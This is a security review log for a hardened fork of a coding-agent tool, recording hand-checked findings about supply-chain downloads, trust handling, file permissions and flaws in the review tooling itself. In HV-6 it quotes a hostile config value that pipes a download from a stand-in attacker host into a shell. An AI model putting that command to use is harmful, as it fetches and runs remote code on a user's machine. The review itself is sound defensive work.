# Hand-verified findings — v0.84.0

Findings the orchestrator verified personally by reading code and running commands, rather than accepting an
agent's claim. Kept separate from `review-v0.84.0.md` (written by the review synthesis) so the provenance of
each is unambiguous: **everything in this file was checked by hand.**

Includes one **refutation** — an agent-raised concern that did not survive checking. Recording negatives
matters: it is the only evidence that the review is discriminating rather than accumulating.

---

## HV-1 — `rg`/`fd` binaries are downloaded and executed with no integrity verification

**Confirmed. Fixed in strape.** Severity: high (supply chain, invisible to every npm control).

`utils/tools-manager.ts` resolves the version from GitHub's *latest release* endpoint at runtime
(`:108-123`), downloads the archive over HTTPS (`:126-135`, `:265-271`), extracts it, and the binary is then
spawned by the `grep` and `find` tools (`core/tools/grep.ts:221`, `core/tools/find.ts:264`). There is no
checksum, no signature, and no pinned version anywhere in that path.

Why it matters more than a typical download-without-verify: **rg and fd are not npm packages.** The lockfile,
the shrinkwrap integrity hashes, the SBOM, `npm audit`, `npm audit signatures`, `osv-scanner` and strape's own
reviewed-deps gate all describe the npm closure only. Every one of them reports this project clean while a
fresh install fetches and executes unverified native binaries the first time a user runs `grep`.

Mitigation in strape, verified working:
- `PI_OFFLINE=1` (set by `strape/bin/strape`) makes the downloader skip and fail closed
  (`tools-manager.ts:337-343`) — confirmed by reading the offline gate at `:15-19`.
- `strape/scripts/provision-tools.mjs` installs pinned, sha256-verified `rg` 14.1.1 and `fd` 10.3.0 into
  `<agentDir>/bin` (`config.ts:549`), which is exactly where the harness looks, so `grep`/`find` keep working.
  Verified end-to-end: refuses to install with no recorded hash, records hashes under `--record`, verifies and
  installs, and `--verify` re-checks. `rg --version` from the installed path returns `ripgrep 14.1.1`.

Residual: a user with system `rg`/`fd` gets those instead (upstream prefers a system binary), which moves
provenance to their package manager — usually an improvement, but it is not verified by strape.

---

## HV-2 — untrusted project settings redirect the session transcript

**Confirmed by dynamic reproduction. Fixed in strape (hunk 7).** Severity: medium-high.

Rationale and fix recorded in [../docs/SECURITY-BACKLOG.md](../docs/SECURITY-BACKLOG.md) Part 1. Summary: `main.ts:617` builds the startup
`SettingsManager` before trust is resolved, and `projectTrusted` defaults to `true`
(`core/settings-manager.ts:325`), so a never-trusted repo's `.strape/settings.json` chooses `sessionDir` and
therefore where the whole session transcript is written. Reproduced: the `.jsonl` landed in the
attacker-designated directory from a freshly `git init`ed repo. Fixed by passing the persisted trust decision;
verified the hole is closed and that trusted projects keep the legitimate feature.

---

## HV-3 — internal packages in the generated shrinkwrap have no integrity hashes

**Confirmed.** Severity: medium, but only on an install path strape must never use.

`packages/coding-agent/npm-shrinkwrap.json` gives each of the six `@earendil-works/pi-*` packages a
`resolved` URL pointing at `registry.npmjs.org` with **no `integrity` field** — e.g.
`node_modules/@earendil-works/pi-ai` has `resolved` and `license` but no hash. Confirmed by parsing the
generated file directly.

Consequence: `npm install` against that shrinkwrap fetches six packages from the public registry with no
integrity verification, in a file whose entire purpose is integrity pinning. For strape this is not the
install path — the internal packages are built from source — but it means **building from source or `file:`
tarballs (`scripts/local-release.mjs`) is the only acceptable distribution route**, not a stylistic
preference. Recorded in `strape/scripts/lockfile-audit.mjs`, which prints it as a standing note on every run,
and in `strape/docs/INSTALL.md`.

---

## HV-4 — session transcripts are not created with restrictive permissions

**Confirmed.** Severity: low as shipped, medium if `sessionDir` is relocated.

A session file created by the built CLI landed at mode **0664** (umask-dependent; 0644 under a 0022 umask),
inside `~/.strape/agent` which is **0700**. `auth.json` is correctly **0600**. So today the parent directory
provides the protection, not the file mode.

That protection is conditional on the transcript staying under the agent dir. `sessionDir` is a documented,
supported setting (`docs/settings.md:206-212`), so a transcript can legitimately be relocated into a project
directory or a shared path — where 0664 means any local user can read the accumulated file contents, command
output, and anything the user pasted. HV-2's attack becomes materially worse for the same reason.

Not fixed in strape: it needs a real code change in the session writer (an eighth hunk), and the safe default
is already in place for the default location. Recorded as accepted risk with the mitigation being: do not
relocate `sessionDir` to a shared or world-traversable path.

---

## HV-5 — self-update explicitly opts out of the npm release-age quarantine

**Confirmed.** Severity: low for strape (the path is unused), noted because it is easy to reintroduce.

`config.ts:159` and `config.ts:175` pass `--minimum-release-age=0` / `--min-release-age=0` in the
self-update commands. That deliberately disables the "don't install a version published in the last N days"
protection which `.npmrc` sets repo-wide (`min-release-age=2`) — precisely the control that blunts a
fast-propagating compromised release.

Not applicable to strape's model: updates flow through the sync playbook against a reviewed tag, and the
launcher sets `PI_SKIP_VERSION_CHECK=1`. It matters only if someone runs `strape update --self`, which the
distribution model does not use. Recorded so that nobody "fixes" the update UX by re-enabling that path
without also removing these flags.

---

## HV-6 — REFUTED: untrusted project cannot inject a shell-command API key via `models.json`

**Refuted by checking.** An agent flagged this as potentially the most severe finding of the review, and it
does not hold.

The concern was real in its first half: config values beginning with `!` **are** shell-executed —
`resolve-config-value.ts:153-164` runs them through the configured shell via `spawnSync`, and
`provider-composer.ts:351` resolves a provider API key through exactly that path, with
`provider-composer.ts:564` labelling the source `models_json_command`. So a `models.json` that supplies
`"apiKey": "!curl attacker.com/x | sh"` would result in shell execution.

The second half fails: **there is no project-scoped `models.json`.** Every load path resolves it under the
global agent dir — `agent-session-services.ts:144` (`join(agentDir, "models.json")`),
`model-runtime.ts:173` (`join(getAgentDir(), "models.json")`), and `sdk.ts:175` (`join(agentDir, …)`). A grep
for `CONFIG_DIR_NAME` near any model path returns nothing, so a repository cannot place a `models.json` that
the harness will read.

Verdict: **not exploitable from untrusted project content.** It remains a live path for anyone who can write
`~/.strape/agent/models.json`, which is inside upstream's stated trust boundary (local write access to the
user's own config), and is therefore accepted risk rather than a finding.

Kept on the record because if upstream ever adds project-scoped model configuration, this becomes a critical
finding immediately — and the reason it is safe today would otherwise be invisible.

---

## HV-7 — the review reviewed the wrong artifact (a flaw in strape's own tooling)

**Confirmed. Fixed in strape's tooling.** Severity: process defect, not a code vulnerability — but the kind
that silently invalidates a review.

The dependency review flagged `retry` as a version mismatch, and it was right for a reason worth recording:

| Where | Path | Version |
|---|---|---|
| shipped closure | `node_modules/proper-lockfile/node_modules/retry` | **0.12.0** |
| dev tree (hoisted for a devDependency) | `node_modules/retry` | 0.13.1 |

The reviewing agent was handed the bare package name, opened `node_modules/retry`, and reviewed **0.13.1** —
an artifact that does not ship. `proper-lockfile/lib/lockfile.js:5` resolves the nested 0.12.0 copy, so the
tarball that actually executes had never been looked at.

Root cause was in strape's own scaffolding, not the agent: `reviewed-deps.mjs` keyed entries by bare
`name@version`, discarding the nesting path, and `.claude/skills/dep-review` told reviewers to read
`node_modules/<name>/`. Both were wrong for any nested package.

Fixes applied:
1. Every entry now carries `shrinkwrapPath`, and the skill instructs reviewers to use it verbatim and to
   confirm the on-disk version first.
2. `reviewed-deps.mjs` gained two mechanical guards: **`artifact-mismatch`** (the on-disk version at the
   nesting path disagrees with the shrinkwrap) and **`path-moved`** (a package was reviewed at one nesting
   path and now ships at another). Either fails the build.
3. `retry@0.12.0` was then reviewed by hand at the correct path: zero runtime dependencies, no
   install/postinstall/preinstall/prepare script, and the shipped `lib/` contains no `child_process`, `eval`,
   `new Function`, network, `fs`, `process.env` or prototype mutation — it is arithmetic over `setTimeout`.
   The one `new Function()` in the package is in `test/integration/`, never required by the entry point.
   Verdict recorded as `allow`.

The lesson generalises: an agent review is only as good as the artifact identity it is given, and identity
must be asserted mechanically rather than assumed. This is why the deterministic layer exists.

---

## HV-8 — the capability sweep's own trust pattern had a blind spot

**Confirmed. Fixed in strape's tooling.** Severity: process defect affecting review coverage.

While confirming that hunks 7-9 introduced no new capability sites, the drift check reported an exact match
(1339 sites) — which was true but suspicious, since hunk 7 adds trust-decision code. Investigating the
patterns showed why, and it was not benign:

The `trust` class used `\b`-anchored patterns (`/\btrust/i`, `/\bapprove/i`, `/\bpermission/i`,
`/\bconfirm/i`). This codebase names its trust checks in camelCase, and `\btrust` **cannot** match the
`Trust` inside `ProjectTrustStore` or `isProjectTrusted` — the preceding character is a word character, so
there is no boundary. Measured over `packages/coding-agent/src`:

| Pattern | Lines matched |
|---|---|
| `\btrust` (as shipped) | 151 |
| `trust` (substring) | 415 |
| `isProjectTrusted` / `projectTrusted` specifically | 54 |

So the sweep was blind to ~264 lines, including **54 occurrences of the trust guards themselves** — the
single most important thing in that capability class, since a capability's guard is what decides whether it
is a finding.

Fixed by dropping the `\b` anchors for the identifier-style patterns in this class (`/trust/i`, `/approv/i`,
`/permission/i`, `/confirm/i`, `/allowlist/i`, `/denylist/i`). The `credentials` class already used substring
matching and was unaffected. Trust-class sites went **235 → 524**, total sites **1339 → 1628**, and the
baseline was regenerated. The drift gate correctly reported `trust: 235 -> 524` before the regeneration, so
that mechanism is confirmed working in the direction that matters.

**Coverage consequence, stated honestly:** the 12 capability-map agents ran against the *old* pattern set, so
the 289 newly-visible trust sites were not in the material they were handed. They are in the baseline now and
any future change to them will surface as drift, but they have not been individually reviewed. This is
recorded in the review's coverage-limitations section rather than quietly absorbed.

The general lesson matches HV-7: the deterministic layer is what makes agent coverage auditable, so its own
correctness is load-bearing. A regex that silently under-matches produces a review that looks complete and
is not — and the only reason this surfaced was following up on a drift result that seemed *too* clean.

---

## HV-9 — the test suite is not green, and 9 of the failures are ours

**Confirmed by isolation.** Severity: not a vulnerability; a correctness claim that was wrong twice and is now
measured.

Two earlier claims in this project's own records were wrong:

1. "`./test.sh` cannot run on this machine." It can. `test.sh` runs the suite under `env -i` with an isolated
   `HOME`, and Volta's `node` shim resolves its toolchain from `$HOME`, hence `Volta error: Node is not
   available`. Putting the real node binary first in `PATH` bypasses the shim with no change to `test.sh`:
   `PATH="$(dirname "$(readlink -f "$(volta which node)")")":$PATH ./test.sh`
2. "`./test.sh` exits 0." That reading came from a run piped to `tail -20`, so the status belonged to `tail`.

Measured properly: `pi-coding-agent` has **16 failing test files / 71 failing tests** (194 passed, 6 skipped);
every other workspace passes.

**Attribution, by isolation rather than inference.** A worktree of `main` with only hunks 7-9 reverted (hunks
1-6 kept, identical dependencies, identical 8 test files) fails 41 tests; with hunks 7-9 applied it fails 50.
Diffing the failing test names gives exactly **9 failures attributable to strape's security fixes, all to
hunk 9** — tests asserting the literal npm/bun/git install argv, which now carries `--ignore-scripts`:

```
expected "runCommand" to be called with arguments: [ 'mise', …(2) ]
+     "--ignore-scripts",
```

**Hunks 7 and 8 cause zero test failures.** The remaining ~62 are not from the security fixes; the spot-checked
cause is the rebrand — `package-manager.test.ts:162` hardcodes `join(tempDir, ".pi", "extensions")` while the
harness now reads `.strape`. Individual root-causing of all 62 was **not** done; that is an open item, not a
claim.

**Why the failures are not "fixed".** A green suite would require editing upstream test files — exactly the
files upstream churns most, so the divergence would conflict on nearly every merge — or reverting the rename
and the install-script hardening, i.e. the fork's purpose.

**Control adopted instead:** `strape/scripts/test-expectations.mjs` + `strape/audit/expected-test-failures.json`.
The exact 71-test failure set is recorded with a cause per entry (`hunk 9` = 9 proven, `hunk 1` = 5 by name
match, `hunk 1 (probable)` = 57 not individually root-caused), and CI fails on **any** deviation:

- a **new** failure is a regression and cannot hide in the noise;
- an expected failure that starts **passing** also fails the build, because it means upstream changed the test
  and both the entry and the hunk justifying it need re-examination.

Both directions were verified by tampering with a captured log (injected failure → caught; removed expected
failures → caught), and the gate refuses to compare against a truncated log rather than silently passing.

The lesson is the same one as HV-7 and HV-8: a claim about the build is only worth what the measurement behind
it is worth, and "exit 0" through a pipe is not a measurement.
